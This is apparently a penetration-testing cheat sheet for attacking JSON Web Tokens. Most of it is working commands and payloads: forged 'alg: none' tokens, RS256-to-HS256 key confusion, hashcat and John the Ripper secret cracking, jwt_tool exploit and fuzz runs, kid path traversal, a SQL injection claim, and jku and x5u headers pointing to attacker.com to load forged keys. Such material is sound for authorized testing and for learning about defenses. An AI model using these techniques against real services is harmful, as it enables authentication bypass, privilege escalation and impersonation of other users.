# JWT

## JWT (Json Web Token) Pentesting <a href="#jwt-json-web-token-pentesting" id="jwt-json-web-token-pentesting"></a>

JWT is a proposed internet standard for creating data with optional signature and optional encryption whose payload holds JSON that asserts some number of claims.

### Decode JWT <a href="#decode-jwt" id="decode-jwt"></a>

* [JWT.io](https://jwt.io/)
* [JWT Debugger](https://token.dev/)
* [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Decode\(\))

### None Algorithm Attack <a href="#none-algorithm-attack" id="none-algorithm-attack"></a>

If the website uses JWT and we can see the token, copy the JWT and paste it in [jwt.io](https://jwt.io/).

1. Replace the **"alg"** value with **"none"** in header. (try the alg header variations such as **"none"**, **"None"**, **"nOnE"**, **"NONE"**.)
2. Replace arbitrary values of the payload e.g. **"username"** with **"admin"**.
3. Empty the signature field.

If the error **"Invalid Signature"** occured, we can manually create Base64 value for each section (remove the **"="** symbol).\
If you want to empty the signature field manually, you can delete the final section.\
For example,

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc4NDYwNjM1fQ.
```

Now copy the JWT.\
Go to the website and replace the original JWT with the new one in HTTP header.

### RS256 → HS256 Algorithm Attack <a href="#rs256-hs256-algorithm-attack" id="rs256-hs256-algorithm-attack"></a>

Reference: [HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555)

When changing the `alg` value from `RS256` (asymmetric) to `HS256` (symmetric) may, the target server may use the public key as the secret key. It may be possible to verify the signature.

We can retrieve the public key with the following command:

```
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

### Modify `exp` Value <a href="#modify-exp-value" id="modify-exp-value"></a>

If our JWT token is invalid, we can also try to increase the `exp` (expiration) value.

### Automation <a href="#automation" id="automation"></a>

[**JWT Toolkit**](https://github.com/ticarpi/jwt_tool) is a toolkit for testing, tweaking and cracking JWT.

#### Decode <a href="#decode" id="decode"></a>

```shellscript
python jwt_tool.py <Base64_Encoded_JWT>
```

#### Scan <a href="#scan" id="scan"></a>

```shellscript
# -t: Target URL
# -rc: Cookies
# -M pb: Playbook Scan Mode
# -cv: Canary Value
python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -M pb -cv "not authorized"
```

#### Exploit <a href="#exploit" id="exploit"></a>

```shellscript
# -X i: Exploit (inject inline)
# -I -pc username -pv admin: Inject Claim ("username": admin)
python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -X i -I -pc username -pv admin
```

#### Fuzz <a href="#fuzz" id="fuzz"></a>

```shellscript
# -I -hc kid -hv wordlist.txt: Inject Claim ("kid": FUZZ)
python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -I -hc kid -hv wordlist.txt
```

#### Manual Pentesting <a href="#manual-pentesting" id="manual-pentesting"></a>

```shellscript
# Tamper (Manual Exploit)
python jwt_tool.py <Base64_Encoded_JWT> -T

# Exploit (Automated Exploit)
# -X a: Exploit (alg: none)
python jwt_tool.py <Base64_Encoded_JWT> -X a
```

### Crack JWT Secret <a href="#crack-jwt-secret" id="crack-jwt-secret"></a>

First of all, you need to put the JWT into the text file.

```shellscript
echo -n '<Base64_Encoded_JWT>' > jwt.txt
# e.g.
echo -n 'eyJraWQiOiI1OGNkYTU1ZS03NDY4LTRhNmMtYTQ2MS00NmIzZjM1MTMwMWYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ0ZXN0Iiwic3ViIjoiYWRtaW4iLCJleHAiOjkxNjg2NDY3NjY1fQ.uK-rKQJzEQ7THoZXcfmHhvnwOE5P46IQIVRWmL4juDM' > jwt.txt
```

Then crack the hash using John the Ripper or Hashcat.

```shellscript
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

hashcat -a 0 -m 16500 jwt.txt passwords.txt
hashcat -a 0 -m 16500 jwt.txt passwords.txt -r rules/best64.rule
hashcat -a 3 -m 16500 jwt.txt '?u?l?l?l?l?l?l?l' -i --increment-min=6
```

If you found a secret, you can create a new JWT using the secret on tools like JWT.io.

Also we can use [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker).

### JWK (Json Web Key) Header Injection <a href="#jwk-json-web-key-header-injection" id="jwk-json-web-key-header-injection"></a>

If the server supports the **`jwk`** in the JWT header, we may be able to add arbitrary **`jwk`** parameters then impersonate another user.\
To perform that, **JWT Editor** extension in Burp Suite is useful.

1. Install JWT Editor in BApp Store in Burp Suite.
2. Go to JWT Editor Keys tab.
3. If the server JWT’s algorithm is RSA such as **RS256**, click **New RSA Key** then click Generate button in the popup.
4. Send request containing JWT to Burp Repeater.
5. Go to **Json Web Token** tab, then modify arbitrary parameter e.g. username.
6. Click **Attack** at the bottom. Select **Embedded JWK**.
7. In the popup, choose our generated key.
8. After that, the **`jwk`** is added in the JWT header.
9. Send request in Repeater.

### JKU (JWK Set URL) Header Injection <a href="#jku-jwk-set-url-header-injection" id="jku-jwk-set-url-header-injection"></a>

If the server supports the **`jku`** in the JWT header, we may be able to add arbitrary URL in the **`jku`** then impersonate another user. As in the JWK section above, **JWT Editor** is useful.\
First of all, generate RSA key as the JWK section above, then serve it in our own web server. The body is as below.

```shellscript
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "9c8bc417-ccbf-4b9d-b22b-b90c82f958c6",
            "n": "g7Qf9pqbHfqOXU3kGs4AnvZZvLsxV4kaxs3gLjgD_J4WMOZI7zmRlxuDg74r6gCKeEDdk4JilkRLnZ85xAG4vRMbuODKD-I1uNv6_ZT6RcCh8YS6tQn-bHPOdfcxgoTGpLBLHpj9dLIPwEFhNQiikJkaQxA_RF1eQAQhFO_6AHRBDNkDJfHUhu9ymbsFSpskMIhi3pMISKKSZSF2vYt3gR3Kq4tjUAnfLW_8XUdeJ56RKjBeVV2IgVfmOn-UvHcnLKm2Kki60G1ViEFcQiRzqp9DY8g91RZSMY3xHO0L2LZg34MZ3NInE7XyaRgupotn7yFImYkvd86L0VwICa6b8w"
        }
    ]
}
```

After that, add **`jku`** in the JWT header and set the URL of our server. Then set the **`kid`** of our generated key into the **`kid`**.\
Finally modify arbitrary value e.g. username.\
As a result, our JWT is as the following.

```shellscript
// Header
{
    "kid": "9c8bc417-ccbf-4b9d-b22b-b90c82f958c6",
    "alg": "RS256",
    "jku": "https://attacker.com/key"
}

// Payload
{
    "user": "administrator"
    "exp": 123456789
}
```

Now send request using the JWT above. We may be able to become administrator.

### References <a href="#references" id="references"></a>

* [PortSwigger](https://portswigger.net/web-security/jwt)

### Tools

```bash
# https://github.com/ticarpi/jwt_tool
# https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

# https://github.com/hahwul/jwt-hack
# https://github.com/mazen160/jwt-pwn
# https://github.com/mBouamama/MyJWT
# https://github.com/DontPanicO/jwtXploiter

# Test all common attacks
python3 jwt_tool.py -t https://url_that_needs_jwt/ -rh "Authorization: Bearer JWT" -M at -cv "Welcome user!"

# Hashcat
# dictionary attacks 
hashcat -a 0 -m 16500 jwt.txt passlist.txt
# rule-based attack  
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
# brute-force attack
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6


# Crack
pip install PyJWT
# https://github.com/Sjord/jwtcrack
# https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
jwt2john.py JWT
./john /tmp/token.txt --wordlist=wordlist.txt

# Wordlist generator crack tokens:
# https://github.com/dariusztytko/token-reverser

# RS256 to HS256
openssl s_client -connect www.google.com:443 | openssl x509 -pubkey -noout > public.pem
cat public.pem | xxd -p | tr -d "\\n" > hex.txt
# Sign JWT with hex.txt 

# Generate JWT from terminal
pip install pyjwt
python3 -c 'import jwt;print(jwt.encode({"role": "admin"},"SECRET",algorithm="HS256").decode("UTF-8"))'
```

### General info

```shellscript
1. Leak Sensitive Info
2. Send without signature
3. Change algorythm r to h
4. Crack the secret h256
5. KID manipulation

eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1ODQ2NTk0MDAsInVzZXJuYW1lIjoidGVtcHVzZXI2OSIsInJvbGVzIjpbIlJPTEVfRVhURVJOQUxfVVNFUiJdLCJhcHBDb2RlIjoiQU5UQVJJX0FQSSIsImlhdCI6MTU4NDU3MzAwMH0.AOHXCcMFqYFeDSYCEjeugT26RaZLzPldqNAQSlPNpKc2JvdTG9dr2ini4Z42dd5xTBab-PYBvlXIJetWXOX80A

https://trustfoundry.net/jwt-hacking-101/
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9
https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a

- JKU & X5U Headers - JWK
    - Header injection
    - Open redirect



- Remember test JWT after session is closed
```

### Attacks

#### Header

```sh
# None algorithm
python3 jwt_tool.py <JWT> -X a

# From RS256 to HS256
python3 jwt_tool.py <JWT> -S hs256 -k public.pem

# Not checked signature
python3 jwt_tool.py <JWT> -I -pc name -pv admin

# Crack secret key
python3 jwt_tool.py <JWT> -C -d secrets.txt 

# Null kid
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Use source file as kid to verify signature
python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"

# jku manipulation for open redirect
python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"

# x5u manipulation for open redirect
openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=CompanyName/CN=pentester"
python3 jwt_tool.py <JWT> -S rs256 -pr private.pem -I -hc x5u -hv "https://attacker.com/custom_x5u.json"
```

#### Payload

```shellscript
# SQLi
python3 jwt_tool.py <JWT> -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem

# Manipulate other values to change expiration time or userID for example
```
